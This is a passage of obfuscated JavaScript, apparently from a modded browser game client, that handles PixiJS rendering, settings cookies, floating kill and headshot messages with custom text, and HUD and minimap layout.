              Ef: _0x503ed4.V(0.09, 0.16) * 0.66,
              Ff: _0x503ed4.V(0, 1),
              Gf: _0x503ed4.V(0, 1),
              Hf: 0,
              yf: _0x571111[0],
              zf: _0x571111[1],
              Af: _0x571111[2]
            };
          }
          this.If();
          this.Jf();
        };
        _0x1d246d.hd = false;
        _0x1d246d.Kf = function (_0x319c0b) {
          _0x1d246d.hd = _0x319c0b;
        };
        _0x1d246d.prototype.Lf = function (_0x3a5c48) {
          this.hf.Kf(_0x3a5c48);
        };
        _0x1d246d.prototype.Jf = function () {
          var _0x3e110a = window.devicePixelRatio ? window.devicePixelRatio : 1;
          this.ff = this.ef.width();
          this.gf = this.ef.height();
          this.lf.resize(this.ff, this.gf);
          this.lf.resolution = _0x3e110a;
          this.Eb.width = _0x3e110a * this.ff;
          this.Eb.height = _0x3e110a * this.gf;
          var _0x234106 = Math.max(this.ff, this.gf) * 0.6;
          for (var _0x2766ed = 0; _0x2766ed < this.vf.length; _0x2766ed++) {
            this.vf[_0x2766ed].width = _0x234106;
            this.vf[_0x2766ed].height = _0x234106;
          }
        };
        _0x1d246d.prototype.Nf = function (_0x27f0e5, _0x82581f) {
          if (_0x1d246d.hd) {
            var _0x3e8e02 = _0x27f0e5 / 1000;
            var _0x392077 = _0x82581f / 1000;
            var _0x34c0ca = this.ef.width();
            var _0x33254c = this.ef.height();
            for (var _0x28f01a = 0; _0x28f01a < this.vf.length; _0x28f01a++) {
              var _0x536e9e = _0x2b377b[_0x28f01a % _0x2b377b.length];
              var _0x428c8c = this.vf[_0x28f01a];
              var _0xa91717 = _0x28f01a / this.vf.length * _0x1525ec.G;
              var _0x30754c = _0x3e8e02 * 0.5 * 0.12;
              var _0x3c057c = Math.cos((_0x30754c + _0xa91717) * 3) * Math.cos(_0xa91717) - Math.sin((_0x30754c + _0xa91717) * 5) * Math.sin(_0xa91717);
              var _0x579c3e = Math.cos((_0x30754c + _0xa91717) * 3) * Math.sin(_0xa91717) + Math.sin((_0x30754c + _0xa91717) * 5) * Math.cos(_0xa91717);
              var _0x27d2ef = 0.2 + Math.cos(_0xa91717 + _0x3e8e02 * 0.075) * 0.2;
              var _0x38fa46 = _0x536e9e.Af * 255 << 16 & 16711680 | _0x536e9e.zf * 255 << 8 & 65280 | _0x536e9e.yf * 255 & 255;
              _0x428c8c.tint = _0x38fa46;
              _0x428c8c.alpha = _0x27d2ef;
              _0x428c8c.position.set(_0x34c0ca * (0.2 + (_0x3c057c + 1) * 0.5 * 0.6), _0x33254c * (0.1 + (_0x579c3e + 1) * 0.5 * 0.8));
            }
            var _0x1688a1 = Math.max(_0x34c0ca, _0x33254c) * 0.05;
            for (var _0x374325 = 0; _0x374325 < this.wf.length; _0x374325++) {
              var _0x183b42 = this.xf[_0x374325];
              var _0x5a439b = this.wf[_0x374325];
              var _0x51ff14 = _0x1525ec.F * _0x374325 / this.wf.length + _0x183b42.Df;
              _0x183b42.Gf += _0x183b42.Ef * _0x392077;
              if (_0x183b42.Gf > 1.1) {
                _0x183b42.Df = Math.random() * _0x1525ec.F;
                _0x183b42.Ef = (0.09 + Math.random() * 0.07) * 0.66;
                _0x183b42.Ff = 0.15 + Math.random() * 0.7;
                _0x183b42.Gf = -0.1;
              }
              var _0x51a27d = _0x183b42.Ff + Math.sin(Math.sin(_0x51ff14 + _0x3e8e02 * 0.48) * 6) * 0.03;
              var _0x5bbabf = _0x183b42.Gf;
              var _0x51d953 = (0.4 + (1 + Math.sin(_0x51ff14 + _0x3e8e02 * 0.12)) * 0.5 * 1.2) * 0.5;
              var _0x2e4a1a = _0x51ff14 + _0x183b42.Ef * 2 * _0x3e8e02;
              var _0x761c1d = _0x503ed4.P(Math.sin(Math.PI * _0x5bbabf), 0.1, 1);
              var _0x30fc16 = _0x183b42.zf * 255 << 8 & 65280 | _0x183b42.Af * 255 << 16 & 16711680 | _0x183b42.yf * 255 & 255;
              _0x5a439b.alpha = _0x761c1d;
              _0x5a439b.tint = _0x30fc16;
              _0x5a439b.position.set(_0x34c0ca * _0x51a27d, _0x33254c * _0x5bbabf);
              _0x5a439b.rotation = _0x2e4a1a;
              var _0x1b1362 = _0x5a439b.texture.width / _0x5a439b.texture.height;
              _0x5a439b.width = _0x51d953 * _0x1688a1;
              _0x5a439b.height = _0x51d953 * _0x1688a1 * _0x1b1362;
            }
            this.Of();
            this.lf.render(this.mf, null, true);
          }
        };
        _0x1d246d.prototype.Pf = function () {
          var _0x5473e8 = _0xf1d21a();
          if (_0x5473e8.Lc.Wb()) {
            var _0x33fa94 = _0x5473e8.Lc.Ub().gb(_0x1a7908);
            for (var _0x4bd828 = 0; _0x4bd828 < _0x1a7908; _0x4bd828++) {
              this.hf.Qf(_0x4bd828, _0x33fa94[_0x4bd828]);
            }
          } else {
            var _0x41bdbc = _0x503ed4.V(0, 1);
            for (var _0x117f9b = 0; _0x117f9b < _0x1a7908; _0x117f9b++) {
              var _0x3d875e = (_0x41bdbc + _0x117f9b / _0x1a7908) % 1;
              var _0x56e343 = _0x503ed4.Y(Math.floor(_0x3d875e * 360), 0.85, 0.5);
              var _0x3c9758 = _0x56e343[0] * 255 & 255 | _0x56e343[1] * 255 << 8 & 65280 | _0x56e343[2] * 255 << 16 & 16711680;
              var _0x27aa34 = "000000" + _0x3c9758.toString(16);
              _0x27aa34 = "#" + _0x27aa34.substring(_0x27aa34.length - 6, _0x27aa34.length);
              this.hf.Rf(_0x117f9b, _0x27aa34);
            }
          }
        };
        _0x1d246d.prototype.If = function () {
          var _0x56dc2e = Math.min(this.ff, this.gf);
          var _0x3b8b4e = Date.now();
          for (var _0x2cddf8 = 0; _0x2cddf8 < _0x1a7908; _0x2cddf8++) {
            var _0x378a24 = _0x2cddf8 / _0x1a7908 * _0x1525ec.F;
            var _0xe80648 = _0x5c96dc(_0x3b8b4e, 0.12, _0x378a24);
            _0xe80648.qa = _0xe80648.qa * 4;
            _0xe80648.ra = _0xe80648.ra * 4;
            this.hf.Sf(_0x2cddf8, (this.ff + _0xe80648.qa * _0x56dc2e) * 0.5, (this.gf + _0xe80648.ra * _0x56dc2e) * 0.5);
          }
        };
        _0x1d246d.prototype.Of = function () {
          var _0x4183ee = Math.min(this.ff, this.gf);
          var _0x248609 = Date.now();
          for (var _0x544bf6 = 0; _0x544bf6 < _0x1a7908; _0x544bf6++) {
            var _0xcde30a = _0x544bf6 / _0x1a7908 * _0x1525ec.F;
            var _0xbf96bf = _0x5c96dc(_0x248609, 0.12, _0xcde30a);
            this.hf.Tf(_0x544bf6, (this.ff + _0xbf96bf.qa * _0x4183ee) * 0.5, (this.gf + _0xbf96bf.ra * _0x4183ee) * 0.5);
          }
          this.hf.Uf();
        };
        var _0x5c96dc = function _0x672073(_0xc5342b, _0x86b457, _0x1cc973) {
          var _0xc3113e = _0xc5342b / 1000;
          return {
            qa: (Math.cos(_0x86b457 * _0xc3113e + _0x1cc973) + Math.cos(_0x86b457 * -32 * _0xc3113e + _0x1cc973) * 0.4 + Math.cos(_0x86b457 * 7 * _0xc3113e + _0x1cc973) * 0.7) * 0.8,
            ra: (Math.sin(_0x86b457 * _0xc3113e + _0x1cc973) + Math.sin(_0x86b457 * -32 * _0xc3113e + _0x1cc973) * 0.4 + Math.sin(_0x86b457 * 7 * _0xc3113e + _0x1cc973) * 0.7) * 0.8
          };
        };
        return _0x1d246d;
      }();
      _0x1c97c7.Vf = function () {
        function _0x237314() {}
        _0x237314.Wf = "consent_state_2";
        _0x237314.Xf = "showPlayerNames";
        _0x237314.Yf = "musicEnabled";
        _0x237314.Zf = "sfxEnabled";
        _0x237314.$f = "account_type";
        _0x237314._f = "gameMode";
        _0x237314.ag = "nickname";
        _0x237314.bg = "skin";
        _0x237314.cg = "prerollCount";
        _0x237314.dg = "shared";
        _0x237314.eg = function (_0x199ce8, _0x2d3656, _0x2f5b90) {
          var _0x2951d1 = new Date();
          _0x2951d1.setTime(_0x2951d1.getTime() + _0x2f5b90 * 86400000);
          var _0x609bc8 = "expires=" + _0x2951d1.toUTCString();
          document.cookie = _0x199ce8 + "=" + _0x2d3656 + "; " + _0x609bc8;
        };
        _0x237314.fg = function (_0x374df4) {
          var _0x19eba7 = _0x374df4 + "=";
          for (var _0x347113 = document.cookie.split(";"), _0x1955bc = 0; _0x1955bc < _0x347113.length; _0x1955bc++) {
            for (var _0x895b44 = _0x347113[_0x1955bc]; _0x895b44.charAt(0) == " ";) {
              _0x895b44 = _0x895b44.substring(1);
            }
            if (_0x895b44.indexOf(_0x19eba7) == 0) {
              if (_0x374df4 == "nickname=") {
                _0x895b44.substring(_0x19eba7.length, _0x895b44.length).substring(0, _0x178144);
              }
              return _0x895b44.substring(_0x19eba7.length, _0x895b44.length);
            }
          }
          return "";
        };
        return _0x237314;
      }();
      _0x1525ec.gg = function () {
        function _0x2b1f1c(_0x539fbb, _0x6bf103, _0x9142bc) {
          var _0x235d6d = false;
          for (var _0x5c8ef0 = _0x9142bc.length, _0x4a0725 = 0, _0x33fbb1 = _0x5c8ef0 - 1; _0x4a0725 < _0x5c8ef0; _0x33fbb1 = _0x4a0725++) {
            if (_0x9142bc[_0x4a0725][1] > _0x6bf103 != _0x9142bc[_0x33fbb1][1] > _0x6bf103 && _0x539fbb < (_0x9142bc[_0x33fbb1][0] - _0x9142bc[_0x4a0725][0]) * (_0x6bf103 - _0x9142bc[_0x4a0725][1]) / (_0x9142bc[_0x33fbb1][1] - _0x9142bc[_0x4a0725][1]) + _0x9142bc[_0x4a0725][0]) {
              _0x235d6d = !_0x235d6d;
            }
          }
          return _0x235d6d;
        }
        var _0x3b5449 = [[-28.06744, 64.95936], [-10.59082, 72.91964], [14.11773, 81.39558], [36.51855, 81.51827], [32.82715, 71.01696], [31.64063, 69.41897], [29.41419, 68.43628], [30.64379, 67.47302], [29.88281, 66.76592], [30.73975, 65.50385], [30.73975, 64.47279], [31.48682, 63.49957], [32.18994, 62.83509], [28.47726, 60.25122], [28.76221, 59.26588], [28.03711, 58.60833], [28.38867, 57.53942], [28.83955, 56.2377], [31.24512, 55.87531], [31.61865, 55.34164], [31.92627, 54.3037], [33.50497, 53.26758], [32.73926, 52.85586], [32.23389, 52.4694], [34.05762, 52.44262], [34.98047, 51.79503], [35.99121, 50.88917], [36.67236, 50.38751], [37.74902, 50.51343], [40.78125, 49.62495], [40.47363, 47.70976], [38.62799, 46.92028], [37.53193, 46.55915], [36.72182, 44.46428], [39.68218, 43.19733], [40.1521, 43.74422], [43.52783, 43.03678], [45.30762, 42.73087], [46.99951, 41.98399], [47.26318, 40.73061], [44.20009, 40.86309], [45.35156, 39.57182], [45.43945, 36.73888], [35.64789, 35.26481], [33.13477, 33.65121], [21.47977, 33.92486], [12.16268, 34.32477], [11.82301, 37.34239], [6.09112, 38.28597], [-1.96037, 35.62069], [-4.82156, 35.60443], [-7.6498, 35.26589], [-16.45237, 37.44851], [-28.06744, 64.95936]];
        return {
          hg: function _0x4991d5(_0x4d99dc, _0xf5a7a5) {
            return _0x2b1f1c(_0xf5a7a5, _0x4d99dc, _0x3b5449);
          }
        };
      }();
      _0x1c97c7.ig = function () {
        function _0x4af58f(_0x5bbf24) {
          var _0x492389 = undefined;
          _0x492389 = _0x5bbf24 > 0 ? "+" + Math.floor(_0x5bbf24) : _0x5bbf24 < 0 ? "-" + Math.floor(_0x5bbf24) : "0";
          var _0x27a018 = Math.min(1.5, 0.5 + _0x5bbf24 / 600);
          var _0xa09927 = undefined;
          if (_0x5bbf24 < 1) {
            _0xa09927 = "0xFFFFFF";
          } else if (_0x5bbf24 < 30) {
            var _0x4834df = (_0x5bbf24 - 1) / 29;
            _0xa09927 = _0x4e759b((1 - _0x4834df) * 1 + _0x4834df * 0.96, (1 - _0x4834df) * 1 + _0x4834df * 0.82, (1 - _0x4834df) * 1 + _0x4834df * 0);
          } else if (_0x5bbf24 < 300) {
            var _0x2bbab7 = (_0x5bbf24 - 30) / 270;
            _0xa09927 = _0x4e759b((1 - _0x2bbab7) * 0.96 + _0x2bbab7 * 0.93, (1 - _0x2bbab7) * 0.82 + _0x2bbab7 * 0.34, (1 - _0x2bbab7) * 0 + _0x2bbab7 * 0.25);
          } else if (_0x5bbf24 < 700) {
            var _0x30b4eb = (_0x5bbf24 - 300) / 400;
            _0xa09927 = _0x4e759b((1 - _0x30b4eb) * 0.93 + _0x30b4eb * 0.98, (1 - _0x30b4eb) * 0.34 + _0x30b4eb * 0, (1 - _0x30b4eb) * 0.25 + _0x30b4eb * 0.98);
          } else {
            _0xa09927 = _0x4e759b(0.98, 0, 0.98);
          }
          var _0x422d3e = Math.random();
          var _0x45a51c = 1 + Math.random() * 0.5;
          return new _0x575bda(_0x492389, _0xa09927, true, 0.5, _0x27a018, _0x422d3e, _0x45a51c);
        }
        function _0x41cd43(_0x48f8fc, _0x3d132d) {
          var _0x138b4d = undefined;
          var _0x27ece0 = undefined;
          if (_0x3d132d) {
            _0x138b4d = 1.3;
            _0x27ece0 = _0x4e759b(0.93, 0.34, 0.25);
          } else {
            _0x138b4d = 1.1;
            _0x27ece0 = _0x4e759b(0.96, 0.82, 0);
          }
          return new _0x575bda(_0x48f8fc, _0x27ece0, true, 0.5, _0x138b4d, 0.5, 0.7);
        }
        function _0x4e759b(_0x5bd2c4, _0x410fa4, _0x4ddea6) {
          return ((_0x5bd2c4 * 255 & 255) << 16) + ((_0x410fa4 * 255 & 255) << 8) + (_0x4ddea6 * 255 & 255);
        }
        var _0x5123be = _0x503ed4.M(_0x32defb.Container, function () {
          _0x32defb.Container.call(this);
          this.jg = [];
          this.kg = 0;
        });
        _0x5123be.prototype.lg = function (_0x51f050) {
          this.kg += _0x51f050;
          if (this.kg >= 1) {
            var _0x27d136 = Math.floor(this.kg);
            this.kg -= _0x27d136;
            var _0x9a5908 = _0x4af58f(_0x27d136);
            this.addChild(_0x9a5908);
            this.jg.push(_0x9a5908);
          }
        };
        _0x5123be.prototype.mg = function (_0xd925b9, _0x14052a) {
          _wup.fnSetCounts("count", _0xd925b9);
          if (_0xd925b9) {
            if (!(window.vps.headshot % 10)) {
              _0x560f4a.fxdo("monsterKillSound");
            } else {
              _0x560f4a.fxdo("headshot");
            }
            const _0x2aecac = window.createCustomMessage(true, _0x14052a);
            var _0x566058 = _0x41cd43(_0x2aecac, true);
            this.addChild(_0x566058);
            this.jg.push(_0x566058);
          } else {
            const _0xdbe8a0 = window.createCustomMessage(false, _0x14052a);
            var _0x27790d = _0x41cd43(_0xdbe8a0, false);
            this.addChild(_0x27790d);
            this.jg.push(_0x27790d);
          }
        };
        (function () {
          const _0x6f85b7 = window.decoder?.H;
          if (_0x6f85b7 && window.decoder) {
            window.decoder.H = function (_0x242902) {
              const _0x425321 = _0x6f85b7.call(this, _0x242902);
              if (_0x242902 === "index.game.floating.headshot") {
                const _0x5d8d51 = window.getLastKilledPlayerName ? window.getLastKilledPlayerName() : null;
                return window.createCustomMessage(true, _0x5d8d51);
              } else if (_0x242902 === "index.game.floating.wellDone") {
                const _0x21c816 = window.getLastKilledPlayerName ? window.getLastKilledPlayerName() : null;
                return window.createCustomMessage(false, _0x21c816);
              }
              return _0x425321;
            };
          }
        })();
        window.createCustomMessage = function (_0xa87ef5, _0x5c417f) {
          if (!window.vps || !window.vps.messageSettings) {
            if (_0xa87ef5) {
              return "HEADSHOT";
            } else {
              return "Well Done!";
            }
          }
          const _0x3ed871 = window.vps.messageSettings;
          if (_0x3ed871.defaultMessages) {
            if (_0xa87ef5) {
              return "HEADSHOT";
            } else {
              return "Well Done!";
            }
          }
          let _0xccd865;
          let _0x53794c;
          let _0x46d9da;
          if (_0xa87ef5) {
            if (_0x3ed871.headshotMsgType === "custom" && _0x3ed871.headshotCustomText) {
              _0xccd865 = _0x3ed871.headshotCustomText;
            } else {
              _0xccd865 = _0x3ed871.headshotMsg || "HEADSHOT";
            }
            _0x53794c = _0x3ed871.showHeadshotName;
            _0x46d9da = _0x3ed871.headshotNamePos;
          } else {
            if (_0x3ed871.killMsgType === "custom" && _0x3ed871.killCustomText) {
              _0xccd865 = _0x3ed871.killCustomText;
            } else {
              _0xccd865 = _0x3ed871.killMsg || "KILLED";
            }
            _0x53794c = _0x3ed871.showKillName;
            _0x46d9da = _0x3ed871.killNamePos;
          }
          if (_0x53794c && _0x5c417f) {
            if (_0x46d9da === "before") {
              return _0x5c417f + " " + _0xccd865;
            } else {
              return _0xccd865 + " " + _0x5c417f;
            }
          }
          return _0xccd865;
        };
        _0x5123be.prototype.Uf = function (_0xc72bf7, _0x51c9f9) {
          var _0x7ea6d5 = _0xf1d21a().og.af.ng;
          var _0x131402 = _0x7ea6d5.lf.width / _0x7ea6d5.lf.resolution;
          var _0xa6f5f3 = _0x7ea6d5.lf.height / _0x7ea6d5.lf.resolution;
          for (var _0x400690 = 0; _0x400690 < this.jg.length;) {
            var _0x244225 = this.jg[_0x400690];
            _0x244225.pg = _0x244225.pg + _0x51c9f9 / 2000 * _0x244225.qg;
            _0x244225.rg = _0x244225.rg + _0x51c9f9 / 2000 * _0x244225.sg;
            _0x244225.alpha = Math.sin(Math.PI * _0x244225.rg) * 0.5;
            _0x244225.scale.set(_0x244225.pg);
            _0x244225.position.x = _0x131402 * (0.25 + _0x244225.tg * 0.5);
            _0x244225.position.y = _0x244225.ug ? _0xa6f5f3 * (1 - (1 + _0x244225.rg) * 0.5) : _0xa6f5f3 * (1 - (0 + _0x244225.rg) * 0.5);
            if (_0x244225.rg > 1) {
              _0x503ed4.U(_0x244225);
              this.jg.splice(_0x400690, 1);
              _0x400690--;
            }
            _0x400690++;
          }
        };
        var _0x575bda = function () {
          return _0x503ed4.M(_0x32defb.Text, function (_0x20151c, _0x18f31f, _0x2892f2, _0x550326, _0x3a951c, _0x23175b, _0x48ec4f) {
            _0x32defb.Text.call(this, _0x20151c, {
              fill: _0x18f31f,
              fontFamily: "PTSans",
              fontSize: 36
            });
            this.anchor.set(0.5);
            this.ug = _0x2892f2;
            this.pg = _0x550326;
            this.qg = _0x3a951c;
            this.tg = _0x23175b;
            this.rg = 0;
            this.sg = _0x48ec4f;
          });
        }();
        return _0x5123be;
      }();
      _0x1c97c7.be = function () {
        function _0x128444(_0x18a09a, _0x18e025) {
          this.Xd = _0x18a09a;
          this.oa = _0x18e025;
        }
        return _0x128444;
      }();
      _0x1c97c7.Ac = {
        vg: 0,
        zc: 16
      };
      _0x1c97c7.GameParams = function () {
        function _0x2dc8fb() {
          this.xg = _0x1c97c7.Ac.vg;
          this.yg = 0;
          this.zg = 500;
          this.Ag = 4000;
          this.Bg = 7000;
        }
        _0x2dc8fb.Cg = 0;
        _0x2dc8fb.prototype.Dg = function () {
          return this.zg * 1.02;
        };
        return _0x2dc8fb;
      }();
      _0x1c97c7.Eg = function () {
        function _0x313fca(_0x224ada) {
          this.ef = _0x224ada;
          this.Eb = _0x224ada.get()[0];
          this.lf = new _0x32defb.Renderer({
            view: _0x224ada.get()[0],
            backgroundColor: _0x2e827c,
            antialias: false
          });
          this.mf = new _0x32defb.Container();
          this.mf.sortableChildren = true;
          this.Fg = Math.floor(Math.random() * 360);
          this.Gg = 0;
          this.Hg = 0;
          this.Ig = 15;
          this.Jg = 0.5;
          this.Kg = 0;
          this.Lg = _0x498743.Lg(_0x1c97c7);
          this.Ng = new _0x32defb.Graphics();
          this.Og = new _0x32defb.Container();
          this.Pg = new _0x32defb.Container();
          this.Pg.sortableChildren = true;
          this.Qg = new _0x32defb.Container();
          this.Rg = new _0x32defb.Container();
          this.Rg.sortableChildren = true;
          this.Sg = new _0x32defb.Container();
          this.Tg = new _0x365577();
          this.Ug = new _0x38cb64();
          this.Vg = new _0x171662();
          this.Wg = new _0x1c97c7.ig();
          this.Xg = new _0x32defb.Sprite();
          this.Yg = {
            x: 0,
            y: 0
          };
          this.ha();
        }
        var _0x2e827c = 0;
        _0x313fca.prototype.ha = function () {
          this.lf.backgroundColor = _0x2e827c;
          this.Lg.sf.zIndex = 1;
          this.mf.addChild(this.Lg.sf);
          this.Ng.zIndex = 20;
          this.mf.addChild(this.Ng);
          this.Og.zIndex = 5000;
          this.mf.addChild(this.Og);
          this.Pg.zIndex = 5100;
          this.mf.addChild(this.Pg);
          this.Qg.zIndex = 10000;
          this.mf.addChild(this.Qg);
          createLine(this.mf, this.Lg.sf);
          this.Xg.texture = _0xf1d21a().xe.Zg;
          this.Xg.anchor.set(0.5);
          this.Xg.zIndex = 1;
          this.Rg.addChild(this.Xg);
          this.Sg.alpha = 0.6;
          this.Sg.zIndex = 2;
          this.Rg.addChild(this.Sg);
          this.Wg.zIndex = 3;
          this.Rg.addChild(this.Wg);
          this.Tg.alpha = 0.8;
          this.Tg.zIndex = 4;
          this.Rg.addChild(this.Tg);
          this.Ug.zIndex = 5;
          this.Rg.addChild(this.Ug);
          this.Vg.zIndex = 6;
          this.Rg.addChild(this.Vg);
          this.Jf();
        };
        _0x313fca.prototype.Jf = function () {
          var _0x477935 = 0;
          var _0x3d080b = 0;
          var _0x507ea1 = this.ef.width() - 245;
          var _0xff8cd9 = 1;
          var _0x570623 = 0;
          var _0x34a95e = 0;
          var _0x4fab87 = this.ef.width();
          var _0x298c6b = this.ef.height();
          var _0x2e5f71 = window.devicePixelRatio ? window.devicePixelRatio : 1;
          var _0x47db9a = _0x2e5f71 * _0x4fab87;
          var _0x4b50db = _0x2e5f71 * _0x298c6b;
          var _0xff1c5a = Math.min(Math.min(_0x4fab87, _0x298c6b), Math.max(_0x4fab87, _0x298c6b) * 0.625);
          this.lf.resize(_0x4fab87, _0x298c6b);
          this.lf.resolution = _0x2e5f71;
          this.Eb.width = _0x47db9a;
          this.Eb.height = _0x4b50db;
          this.Jg = _0xff1c5a;
          this.Xg.position.set(_0x4fab87 / 2, _0x298c6b / 2);
          this.Xg.width = _0x4fab87;
          this.Xg.height = _0x298c6b;
          var _0x45171a = this.ef.width();
          var _0x15c47b = vps.hudSettings.mode == 0 ? 60 + _0x477935 : _0x45171a / 2 + (60 + _0x477935) - _0x45171a * vps.hudSettings.wi;
          var _0x2f8ce7 = vps.hudSettings.mode == 0 ? 110 : _0x45171a / 2 + 110 - _0x45171a * vps.hudSettings.wi;
          var _0x1aa189 = vps.hudSettings.mode == 0 ? this.ef.width() - 245 : _0x45171a / 2 - 225 + _0x45171a * vps.hudSettings.wi - 50;
          this.Tg.position.set(_0x15c47b, 60 + _0x3d080b + (_0x570623 ? this.Tg.height / 4 : 0));
          this.Ug.position.set(_0x2f8ce7, 10);
          this.Vg.position.set(_0x1aa189, _0xff8cd9 + (_0x34a95e ? this.Vg.height : 0));
          if (ctxx.labelRoom) {
            if (ctxx.labelRoom.parent) {
              ctxx.labelRoom.parent.removeChild(ctxx.labelRoom);
            }
            if (this.Tg.parent) {
              this.Tg.parent.addChild(ctxx.labelRoom);
            }
            var _0x48f6ab;
            if (vps.hudSettings.mode == 0) {
              _0x48f6ab = _0x45171a - 120;
            } else if (vps.hudSettings.mode == 1) {
              _0x48f6ab = _0x45171a / 2 - 120 + _0x45171a * vps.hudSettings.wi + -15;
            } else {
              _0x48f6ab = _0x45171a / 2 - 120 + -10;
            }
            ctxx.labelRoom.position.x = _0x48f6ab - 8;
            ctxx.labelRoom.position.y = 1;
            ctxx.labelRoom.visible = true;
          }
          this.Tg.rotation = _0x570623;
          this.Vg.rotation = _0x34a95e;
        };
        _0x313fca.prototype.Uf = function (_0x3c4ccf, _0xa4ced) {
          var _0x348924 = _0x3b6ea9;
          this.Ig = 15;
          this.Og.removeChildren();
          this.Pg.removeChildren();
          this.Qg.removeChildren();
          this.Sg.removeChildren();
          this.Lg.$g(_0x3c4ccf.xg === _0x1c97c7.Ac.vg ? _0x348924.xe._g : _0x348924.xe.ah);
          var _0x344e43 = this.Ng;
          _0x344e43.clear();
          _0x344e43.lineStyle(0.2, 16711680, 0.3);
          _0x344e43.drawCircle(0, 0, _0x3c4ccf.zg);
          _0x344e43.endFill();
          this.Vg.bh = _0xa4ced;
          this.Sg.visible = _0xa4ced;
        };
        _0x313fca.prototype.Nf = function (_0x5558e1, _0x30ba07) {
          if (this.lf.width <= 5) {
            return;
          }
          var _0x467c4e = _0x3b6ea9;
          var _0x3edb71 = _0x467c4e.dh.ch;
          var _0x3eef15 = this.lf.width / this.lf.resolution;
          var _0x2a8150 = this.lf.height / this.lf.resolution;
          this.Ig = _0x498743.$F.Q(this.Ig, _0x467c4e.dh.eh, _0x30ba07, 0.002);
          var _0xaa02d6 = this.Jg / (this.Ig * _0x15b497);
          var _0x28994a = _0x467c4e.dh.ch.dd[_0x498743.$C.fd.qd];
          var _0x336f4c = _0x28994a != null && _0x28994a.hd;
          this.Kg = _0x498743.$F.P(this.Kg + _0x30ba07 / 1000 * ((_0x336f4c ? 1 : 0) * 0.1 - this.Kg), 0, 1);
          this.Xg.alpha = this.Kg;
          this.Fg = (this.Fg + _0x30ba07 * 0.01) % 360;
          this.Gg = Math.sin(_0x5558e1 / 1200 * 2 * Math.PI);
          var _0xe51f12 = _0x3edb71.fh();
          this.Yg.x = _0x498743.$F.R(this.Yg.x, _0xe51f12.x, _0x30ba07, window.vps.smoothCamera, 33.333);
          this.Yg.y = _0x498743.$F.R(this.Yg.y, _0xe51f12.y, _0x30ba07, 0.5, 33.333);
          var _0x447c63 = _0x3eef15 / _0xaa02d6 / 2;
          var _0x5d2bdc = _0x2a8150 / _0xaa02d6 / 2;
          _0x467c4e.dh.gh(this.Yg.x - _0x447c63 * 1.3, this.Yg.x + _0x447c63 * 1.3, this.Yg.y - _0x5d2bdc * 1.3, this.Yg.y + _0x5d2bdc * 1.3);
          if (!vps.backgroundMap) {
            this.Lg.Uf(this.Yg.x, this.Yg.y, _0x447c63 * 2, _0x5d2bdc * 2);
          }
          var _0x54fbbc = _0x467c4e.dh.hh.zg;
          this.mf.scale.set(_0xaa02d6, _0xaa02d6);
          this.mf.position.set(_0x3eef15 / 2 - this.Yg.x * _0xaa02d6, _0x2a8150 / 2 - this.Yg.y * _0xaa02d6);
          var _0x24b18a = Math.hypot(_0xe51f12.x, _0xe51f12.y);
          if (_0x24b18a > _0x54fbbc - 10) {
            this.Hg = _0x498743.$F.P(1 + (_0x24b18a - _0x54fbbc) / 10, 0, 1);
            var _0x4c94ce = Math.cos(this.Fg * _0x498743.$V.F / 360) * (1 - this.Hg) + this.Hg * 1;
            var _0x5d6d19 = Math.sin(this.Fg * _0x498743.$V.F / 360) * (1 - this.Hg);
            var _0x29681d = (Math.atan2(_0x5d6d19, _0x4c94ce) + _0x498743.$V.F) % _0x498743.$V.F * 360 / _0x498743.$V.F;
            var _0x5ee41a = this.Hg * (0.5 + this.Gg * 0.5);
            var _0x81d23a = _0x498743.$F.Y(Math.floor(_0x29681d), 1, 0.75 - this.Hg * 0.25);
            this.Lg.Ec(_0x81d23a[0], _0x81d23a[1], _0x81d23a[2], 0.1 + _0x5ee41a * 0.2);
          } else {
            this.Hg = 0;
            var _0x37d827 = _0x498743.$F.Y(Math.floor(this.Fg), 1, 0.75);
            this.Lg.Ec(_0x37d827[0], _0x37d827[1], _0x37d827[2], 0.1);
          }
          for (var _0x1d033d = 0; _0x1d033d < this.Sg.children.length; _0x1d033d++) {
            var _0x17b21b = this.Sg.children[_0x1d033d];
            _0x17b21b.position.set(_0x3eef15 / 2 - (this.Yg.x - _0x17b21b.ih.x) * _0xaa02d6, _0x2a8150 / 2 - (this.Yg.y - _0x17b21b.ih.y) * _0xaa02d6);
          }
          this.Tg.jh.position.x = _0xe51f12.x / _0x54fbbc * this.Tg.kh;
          this.Tg.jh.position.y = _0xe51f12.y / _0x54fbbc * this.Tg.kh;
          _wupin.myLocation = this.Tg.jh;
          window.playerCoords = {
            x: this.Tg.jh.position.x,
            y: this.Tg.jh.position.y
          };
          this.Ug.lh(_0x5558e1);
          this.Wg.Uf(_0x5558e1, _0x30ba07);
          this.lf.render(this.mf, null, true);
          this.lf.render(this.Rg, null, false);
        };
        _0x313fca.prototype.mh = function (_0x229e90, _0x5e527b) {
          _0x5e527b.nh.Cc.Qc().zIndex = (_0x229e90 + 2147483648) / 4294967296 * 5000;
          this.Og.addChild(_0x5e527b.nh.Dc.Qc());
          this.Pg.addChild(_0x5e527b.nh.Cc.Qc());
        };
        _0x313fca.prototype.oh = function (_0x40cb8e, _0x2a44d8, _0x4e9f00) {
          _0x2a44d8.nc.zIndex = _0xf1d21a().dh.hh.yg ? 0 : 10 + (_0x40cb8e + 32768) / 65536 * 5000;
          this.Qg.addChild(_0x2a44d8.nc);
          if (_0x40cb8e != _0xf1d21a().dh.hh.yg) {
            this.Sg.addChild(_0x4e9f00);
          }
        };
        var _0x365577 = function () {
          return _0x503ed4.M(_0x32defb.Container, function () {
            _0x32defb.Container.call(this);
            this.kh = 40;
            this.qh = new _0x32defb.Sprite();
            this.qh.anchor.set(0.5);
            var _0x3401a1 = new _0x32defb.Graphics();
            _0x3401a1.beginFill("black", 0.4);
            _0x3401a1.drawCircle(0, 0, this.kh);
            _0x3401a1.endFill();
            _0x3401a1.lineStyle(2, 16225317);
            _0x3401a1.drawCircle(0, 0, this.kh);
            _0x3401a1.moveTo(0, -this.kh);
            _0x3401a1.lineTo(0, +this.kh);
            _0x3401a1.moveTo(-this.kh, 0);
            _0x3401a1.lineTo(+this.kh, 0);
            _0x3401a1.endFill();
            this.jh = new _0x32defb.Graphics();
            this.qh.alpha = 0.5;
            this.jh.zIndex = 100001;
            this.jh.alpha = 0.9;
            this.jh.beginFill(16225317);
            this.jh.drawCircle(0, 0, this.kh * 0.1);
            this.jh.endFill();
            this.jh.lineStyle(1, "black");
            this.jh.drawCircle(0, 0, this.kh * 0.1);
            this.jh.endFill();
            this.addChild(_0x3401a1);
            this.addChild(this.qh);
            this.addChild(this.jh);
